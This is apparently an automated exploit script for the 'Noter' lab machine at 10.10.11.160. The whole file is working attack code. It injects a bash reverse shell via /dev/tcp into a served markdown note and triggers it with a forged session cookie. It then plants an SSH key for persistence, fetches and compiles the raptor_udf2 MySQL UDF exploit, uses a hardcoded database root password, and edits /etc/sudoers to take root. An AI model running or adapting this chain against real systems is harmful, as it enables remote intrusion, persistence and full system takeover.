import requests
try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Noter ~ GatoGamer1155\n")
except:
    print('\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n')
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

if len(sys.argv) < 2:
    print(f"[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <ip>\n")
    exit(1)

rsa = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACCgRQfFbAT+ymCP/M1mw5YsrwOmqGkq6CS0XpVjT1iZhAAAAJA2yx0UNssd\nFAAAAAtzc2gtZWQyNTUxOQAAACCgRQfFbAT+ymCP/M1mw5YsrwOmqGkq6CS0XpVjT1iZhA\nAAAEDD/e9ME3S+VU3cvG/CwHOodb4Un8u/+ucnd0GCccAOkaBFB8VsBP7KYI/8zWbDliyv\nA6aoaSroJLRelWNPWJmEAAAAC3Jvb3RAcGFycm90AQI=\n-----END OPENSSH PRIVATE KEY-----"
md = f"--';bash -i >& /dev/tcp/{sys.argv[1]}/443 0>&1;'--"

with open('key', 'w') as f:
    f.write(rsa)
with open('note.md', 'w') as f:
    f.write(md)

def serr():
    os.system("python3 -m http.server 6000")

def cmd():
    time.sleep(1)
    target = "http://10.10.11.160:5000/export_note_remote"
    data = "url=http://"
    note = ":6000/note.md"
    headers = {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yt3RAw.WEmtfGhrymx9PMK0Ir7eS7Q55Rk"}
    requests.post(target, data=data + sys.argv[1] + note, headers=headers, verify=False)

threading.Thread(target=serr, args=()).start()
threading.Thread(target=cmd, args=()).start()
shell = listen(443, timeout=30).wait_for_connection()
time.sleep(0.5)
shell.sendline(b"mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKBFB8VsBP7KYI/8zWbDliyvA6aoaSroJLRelWNPWJmE root@parrot' > ~/.ssh/authorized_keys")
wget("https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c", "raptor_udf2.c")
os.system("gcc -g -c raptor_udf2.c; gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc")

request = ssh(host='10.10.11.160', user='svc', keyfile='key')
shell = request.process("/bin/sh")
request.upload("raptor_udf2.so")
shell.sendline(b"mysql -u'root' -p'Nildogg36'")
shell.sendline(b"use mysql;")
shell.sendline(b"create table foo(line blob);")
shell.sendline(b"insert into foo values(load_file('/home/svc/raptor_udf2.so'));")
shell.sendline(b"select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';")
shell.sendline(b"create function do_system returns integer soname 'raptor_udf2.so';")
shell.sendline(b"select * from mysql.func;")
shell.sendline(b'''select do_system('echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers');''')
shell.sendline(b"exit")
shell.sendline(b"sudo sh")
shell.recvuntil(b"#")
shell.sendline(b"export HOME=/; bash")
shell.sendline(b"export HOME=/root; cd; clear")
shell.interactive()
